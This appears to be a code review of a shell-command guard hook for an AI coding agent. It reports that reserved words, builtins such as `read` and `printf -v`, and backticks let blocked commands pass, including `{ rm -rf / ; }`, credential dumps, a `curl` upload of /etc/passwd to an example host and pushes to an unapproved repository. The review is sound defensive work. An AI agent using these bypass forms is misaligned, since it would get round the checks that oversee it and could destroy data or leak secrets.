## Verdict: FAIL

Every reproduction from R-D008-1 and R-D008-2 is now denied, and every check passes on the head. But the program-identification step that L-096's frame note puts at the centre of the design still fails on ordinary shell syntax:

- **A shell reserved word in front of a command hides it from every check (R3-1).** The guard takes the first word of each simple command as the program. When that word is `{`, `then`, `do`, `else`, `!` or `coproc`, no rule runs on the command that follows it. Examples the guard allows: `{ git push origin main; }`, `if :; then git reset --hard HEAD~1; fi` in the live tree, `{ gh pr list; }`, `{ printenv; }`, `{ rm -rf / ; }`.
- **The `HOME`/`XDG_`/`GIT_` ban matches only the text `NAME=` (R3-2).** The builtins `read`, `printf -v` and a `for` loop variable set and export `GIT_DIR`, `HOME` or `XDG_CONFIG_HOME` without that text. The push address check then resolves a different repository's settings than the ones git uses for the push.
- **A backtick command substitution inside an assignment is not analysed (R3-3):** ``x=`printenv` `` and ``y=`git -C <live tree> checkout HEAD~1` `` are allowed.

All three are plain commands: no interpreter, script or sourced file. L-096 says that "a fourth finding of a *plain-command* bypass of (a) would reopen the frame, not add a patch". R3-1 is that finding. R3-1 is not new in this range. It has existed since at least `889cb68`, and neither earlier review nor the red-team pre-check found it. Any fix changes `.claude/hooks/tool_allowlist.py` (class high), so a conditional pass could not bind the head that results.

## Blocking findings

### R3-1 · A reserved word as the first word hides the command from every rule (B1 to B9, B11, and the live-tree ban)

- **Location:** `.claude/hooks/tool_allowlist.py`, `shell_checks()`, which treats `prog = os.path.basename(args[0])` as the program, and `simple_commands()`, which splits only on `; && || | & ( )`. Bash reserved words are not handled anywhere. `tools/test_tool_allowlist.sh` has no case for them.
- **Problem:** in `{ cmd; }`, `if …; then cmd; fi`, `for …; do cmd; done`, `while/until …; do cmd; done`, `select …; do cmd; done`, `! cmd`, `coproc cmd` and `function f { cmd; }`, the guard sees the program as `{`, `then`, `do`, `!`, `coproc` or `function`. None of these matches a rule, so the call is allowed under B0 and `cmd` is never checked. Redirection targets are still checked, because those checks run before the program word is read. Everything decided by the program does not run.
- **Reproduced (guard decision `allow`, rule B0, on the head):**
  - Push bans: `{ git push /tmp/r3b/evil.git claude/x; }` (the bare form is denied by B3); `if true; then git push /tmp/r3b/evil.git main; fi`; `for x in 1; do git push origin main; done`; `! git push origin main`; `until true; do git push -f origin main; done`; `coproc git push origin main`; `select x in 1; do git push origin main; done`.
  - Live tree (B4), with the scratch clone as `ROOT`: `{ git checkout HEAD~1; }` and `if :; then git reset --hard HEAD~1; fi`. Without the prefix, `git checkout HEAD~1` is denied by B4.
  - Guarded files (B5): `{ cp /tmp/x .claude/hooks/tool_allowlist.py; }`.
  - Credentials and dumps (B7, B8): `{ gh pr list; }`, `{ printenv; }`, `if :; then env; fi`, `{ export -p; }`.
  - Uploads (B6): `then curl -d @/etc/passwd https://example.com`.
  - Critical path (B9): `{ rm -rf / ; }` and `then rm -rf ~`. These were judged by the guard only, never run.
- **Why it blocks:** criterion (d) bans each of these outcomes, and §9 presents the bans as enforced against plain commands. These are not tricks. `if …; then …; fi`, `for …; do …; done` and `{ …; } 2>&1` are what a session writes every day, so an accident does not need an injection. An injected instruction needs only one extra `{`. It also answers (h)1 with yes (below).
- **Suggested fix:** this is a gap in step (a), program identification, so the fix belongs there and not in a deny list:
  - Treat bash reserved words (`{ } ! if then elif else fi for while until do done case esac select function coproc in time [[ ]]`) as separators or prefixes, and identify the command word after them. For `for`/`select`/`case`, skip the header up to `do` or `in … )`.
  - Or refuse (G0) any simple command whose first word is a reserved word the guard does not model.
  - Planted cases: one for each form above. Near misses: `for f in *.md; do wc -l "$f"; done` and `if [ -f x ]; then cat x; fi` stay allowed.

### R3-2 · Settings environment set without `NAME=` text (B11, B3)

- **Location:** `GIT_ENV_OVERRIDE`, as used by `shell_checks()` (search over the command text) and `strip_wrappers()` (leading assignments). The regex needs the literal `NAME=`.
- **Problem:** bash builtins set and export a variable without writing `NAME=`: `read GIT_DIR <<< <path>`, `printf -v HOME %s <dir>`, `for XDG_CONFIG_HOME in <dir>; do …`, and `declare GIT_DIR; GIT_DIR+=<path>` (`+=` is not `=` right after the name). After `export GIT_DIR`, the later `git push origin claude/x` in the same command runs on the repository named by `GIT_DIR`. `push_checks()` runs `git -C <cwd> remote get-url --push --all origin` in the hook's own environment, so it checks the current clone's `origin` (the `devos` URL) and allows the push.
- **Reproduced:**
  - Guard decision `allow` (B0): `read GIT_DIR <<< /tmp/r3b/evil.git; export GIT_DIR; git push origin claude/x`; `for XDG_CONFIG_HOME in /tmp/r3b/x; do export XDG_CONFIG_HOME; git push origin claude/x; done`; `printf -v HOME %s /tmp/r3b; git push origin claude/x`; `declare GIT_DIR; GIT_DIR+=/tmp/r3b/evil.git; export GIT_DIR`. The `for` form is also hidden by R3-1.
  - Git's side, shown with a read only: in the throwaway clone, `read GIT_DIR <<< /tmp/r3b/evil.git; export GIT_DIR; git rev-parse --absolute-git-dir` printed `/tmp/r3b/evil.git`. A later push in that command therefore uses that repository's remote configuration, not the one the guard resolved. Writing `<bare repository>/config` is allowed for the file tools (`Write /tmp/r3b/evil.git/config` → T1), because a bare repository's directory is not named `.git`. Real git already showed in R-D008-2 N-2 route 3 that the push then follows that configuration.
- **Why it blocks:** this is criterion (d)'s "a push … to a remote other than `devos`", by plain builtins. L-096 states that B11 denies "`HOME`/`XDG_`/`GIT_` assignments", and the denial is lexical on one spelling.
- **Suggested fix:**
  - Deny any mention of a protected variable name (`HOME`, `XDG_*`, `GIT_*` outside the listed author/committer ones) as a word given to `read`, `printf -v`, `export`, `declare`/`typeset`/`local`, `readonly`, `unset`, `for`, `select` or `mapfile`/`readarray`. Simpler and more robust: deny any word that is exactly one of those names, or `NAME+=`.
  - Or make `push_checks()` independent of environment: run the address check with the same `GIT_DIR` discovery git will use, by denying a push in any command that also mentions `GIT_DIR`, `HOME` or `XDG_`.
  - Add planted cases for each builtin above.

### R3-3 · A backtick substitution in an assignment is not analysed

- **Location:** `strip_wrappers()` drops a leading `NAME=value` word whole. `$(...)` is split into separate tokens by `shlex`'s punctuation, so the inner command is checked. Backticks are not split, so a command inside backticks is never seen.
- **Reproduced (allow, B0):** ``x=`printenv` `` (the `$(printenv)` form is denied by B8); ``y=`git -C <live tree> checkout HEAD~1` `` (the bare form is denied by B4).
- **Why it blocks:** it is a plain-command bypass of B8 and B4. Taken alone it could be argued as "indirection" under §9's lexical residual. But §9 names indirection "in ways other than those denied", and `$(...)` is analysed, so the backtick form is an inconsistency in step (a), not a stated residual.
- **Suggested fix:** analyse the text between backticks as a nested command (as `bash -c` is), or deny any unquoted or double-quoted backtick (G0). Planted cases: the two above.

## Minor findings

### R3-4 · `[` and `[[` are now denied as "not a plain word" (new in this range; false positive)

- **Location:** `shell_checks()`: `if any(c in args[0] for c in "$`*?[")` (red-team fix #2, `8672809`).
- **Problem:** `[ -f x ] && echo y` and `[[ -n "$x" ]] && echo y` are denied by G0. These are the test builtins, used in nearly every shell conditional a session writes. They are not in the criterion's list of named daily commands, and `test -f x` remains allowed. Because of R3-1, `if [ … ]` is denied while `if :; then …` is not, which is backwards.
- **Fix:** allow the exact words `[` and `[[` as command names (they are builtins, and their arguments run nothing). Add near misses.

### R3-5 · A bare repository's `config` is writable by the file tools and by the shell

- `guarded_zone()` recognises only a path component named `.git`. `Write /tmp/r3b/evil.git/config` is allowed (T1). On its own this is safe, because `push_checks()` resolves the address in the directory git will use (the hook and git discover the same bare repository from `cwd`). It is the enabler for R3-2, and it is a place git reads hooks from (`<bare>/hooks/`), which is F2's stated reason. Consider treating a directory that contains `HEAD`, `config` and `objects/` as git internals, or reword (d) and F2 to "`.git/` directories".

### R3-6 · Smaller items

- A write into the decision log is reported under rule F4 ("credentials", `file_checks`, `"F4" if "decision log" in z`). The reason text then explains credentials, which is wrong for the log. Give the log its own rule, or use F2/F3 wording.
- The NUL check in `decide()` covers only top-level string values (`{"script": …, "args": {"a": "b\u0000"}}` passes to the `Workflow` branch). No internal error resulted, so this is not a fail-open. It does not match L-096's general wording.
